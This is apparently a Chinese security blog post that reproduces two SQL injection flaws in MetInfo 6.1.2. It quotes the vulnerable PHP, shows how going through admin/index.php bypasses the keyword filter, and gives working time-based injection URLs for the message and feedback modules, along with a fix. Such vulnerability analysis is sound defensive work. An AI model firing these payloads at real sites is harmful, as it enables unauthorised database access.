---
title: Metinfo6.1.2 两处sql注入分析
date: 2018-10-16 08:19:32
tags:
	- 漏洞分析
	- sql注入
---

# 前言

Metinfo算是我审的第一个cms吧，前期感觉算是一个写的不怎么好的cms，伪全局变量的问题更是不知道引发了多少次漏洞。还记得那些网上的审计教程，说到变量覆盖这个问题都是以metinfo来举例的。但后期逐渐来了次mvc的大换血，框架更新了下，变量问题也得到了相应调整，也算是逐渐在变好吧。

说了那么多，由于是第一个接触的cms问题，最近被爆出洞也就跟着一起复现了下（我好菜啊。。反正我就挖不到

# SQL注入1

漏洞出现在`app/system/message/web/message.class.php:37`的`add`函数中

```php
public function add($info) {
    global $_M;
    if(!$_M[form][id]){
        $message=DB::get_one("select * from {$_M[table][column]} where module= 7 and lang ='{$_M[form][lang]}'");
        $_M[form][id]=$message[id];
    }
    $met_fd_ok=DB::get_one("select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and  name= 'met_fd_ok' and columnid = {$_M[form][id]}");
    $_M[config][met_fd_ok]= $met_fd_ok[value];
    ...
```

可以看到`{$_M[form][id]}`没有被单引号包裹起来，从而可能产生注入。

但是是个cms就会存在字符串过滤，来看下其中的过滤语句`app/system/include/function/common.func.php:51`

```php
function daddslashes($string, $force = 0) {
	!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
	if(!MAGIC_QUOTES_GPC || $force) {
		if(is_array($string)) {
			foreach($string as $key => $val) {
				$string[$key] = daddslashes($val, $force);
			}
		} else {
			if(!defined('IN_ADMIN')){
				$string = trim(addslashes(sqlinsert($string)));
			}else{
				$string = trim(addslashes($string));
			}
		}
	}
	return $string;
}
```

`sqlinsert`函数里过滤了相当多的sql关键字，而且只要匹配到出现，参数就直接返回空（相当暴力了

这样，就要想办法绕过`!defined('IN_ADMIN')`限制，全局搜索一下这个定义的地方，就可以看到是在`admin/index.php`中

```php
define('IN_ADMIN', true);
//接口
$M_MODULE='admin';
if(@$_GET['m'])$M_MODULE=$_GET['m'];
if(@!$_GET['n'])$_GET['n']="index";
if(@!$_GET['c'])$_GET['c']="index";
if(@!$_GET['a'])$_GET['a']="doindex";
@define('M_NAME', $_GET['n']);
@define('M_MODULE', $M_MODULE);
@define('M_CLASS', $_GET['c']);
@define('M_ACTION', $_GET['a']);
require_once '../app/system/entrance.php';
```



但是直接去访问`add`模块的时候，就显示

```
add function no permission load!!!
```

是由于其只能调用带`do`的方法，这样，恰好在`add`函数上方，就存在一个

```php
public function domessage() {
    global $_M;
    if($_M['form']['action'] == 'add'){
    $this->check_field();
    $this->add($_M['form']);
}	...
```

恰好调用了`$this->add($_M['form']);`,`$_M['form']`里保存的就是POST和GET传入的参数

然后就是构造payload，这里需要绕过`$this->check_field()`的验证，只要抓取正常留言的参数，就可以绕过，于是payload就变成了如下

```
http://localhost/metinfo6.1.2/admin/index.php
?m=web
&n=message
&c=message
&a=domessage
&action=add
&para137=admin
&para186=a@a.com
&para138=15555555555
&para139=admin
&para140=admin
&id=10 or sleep(3)
```

这里我直接把sql语句die了出来

![](Metinfo6-1-2-两处sql注入分析\3.png)

![](Metinfo6-1-2-两处sql注入分析\1.png)

可以看到这里直接拼接到了sql语句中，不过需要控制好sleep的时间，跟数据条数有关，不过这里只是用于验证了

而且这里验证码的判断是在执行这条语句之后，否则，正常情况是要通过验证码判断才能执行语句

```php
$met_fd_ok=DB::get_one("select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and  name= 'met_fd_ok' and columnid = {$_M[form][id]}");
$_M[config][met_fd_ok]= $met_fd_ok[value];
if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',"{$_M[word][Feedback5]}");
if($_M[config][met_memberlogin_code]){
    if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){
        okinfo(-1, $_M['word']['membercode']);
    }
}
```

实际情况中，漏洞原作者提供了一个更好的布尔盲注方式，可以参考https://bbs.ichunqiu.com/thread-46687-1-1.html

至于修复的话，就主要就是把`id`变量用单引号引起来就可以了

# SQL注入2

这个漏洞和之前的洞很相似了，但是存在限制条件

漏洞发生在`app/system/feedback/web/feedback.class.php:39`

```php
public function add($info) {
    global $_M;
    $query="select * from {$_M[table][config]} where name ='met_fd_ok' and columnid='{$_M[form][id]}' and lang='{$_M[form][lang]}'";

    $met_fd_ok=DB::get_one($query);
    $_M[config][met_fd_ok]=$met_fd_ok[value];
    if(!$_M[config][met_fd_ok]){
    	okinfo(-1, $_M['word']['Feedback5']);
    }
    if($_M[config][met_memberlogin_code]){
         if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code']) ){
            okinfo(-1, $_M['word']['membercode']);
         }
    }
    if($this->checkword() && $this->checktime()){
        foreach ($_FILES as $key => $value) {
            if($value[tmp_name]){
            	$ret = $this->upfile->upload($key);//上传文件
            if ($ret['error'] == 0) {
                    $info[$key]=$ret[path];
                } else {
                    okinfo('javascript:history.back();',$_M[word][opfailed]);
            	}
            }
    }
    $user = $this->get_login_user_info();
    $fromurl= $_M['form']['referer'] ? $_M['form']['referer'] : HTTP_REFERER;
    $ip=getip();

    $feedcfg=DB::get_one("select * from {$_M[table][config]} where lang ='{$_M[form][lang]}'and name='met_fd_class' and columnid ='{$_M[form][id]}'");
    $_M[config][met_fd_class]=$feedcfg[value];
    $fdclass2="para".$_M[config][met_fd_class];
    $fdclass=$_M[form][$fdclass2];
    $title=$fdclass." - ".$_M[form][fdtitle];
    $addtime=date('Y-m-d H:i:s',time());
    $met_fd_type=DB::get_one("select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and  name= 'met_fd_type' and columnid = {$_M[form][id]}");
	....
```

还是最后一句的sql语句中没有单引号保护，但是可以看到前面有一个比较头疼的限制就是验证码

```php
if($_M[config][met_memberlogin_code]){
    if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code']) ){
    	okinfo(-1, $_M['word']['membercode']);
    }
}
```

我这里图个方便，测试的时候就直接把验证码部分注释了

还是和之前一样的调用方式，就可以调用到这个`add`方法

需要注意的几点是，`lang=cn`还有`id=44`

最后的payload

```
http://localhost/metinfo6.1.2/admin/index.php
?m=web
&n=feedback
&c=feedback
&a=dofeedback
&lang=cn
&id=44 or sleep(0.01)
&action=add
```

![](Metinfo6-1-2-两处sql注入分析\2.png)

实际当中就需要每次输入验证码，还有个120秒的请求限制





